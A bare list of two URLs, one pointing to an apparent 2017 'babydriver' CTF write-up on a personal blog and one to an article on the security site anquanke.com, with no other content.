http://muhe.live/2017/07/13/babydriver-writeup/

https://www.anquanke.com/post/id/86490
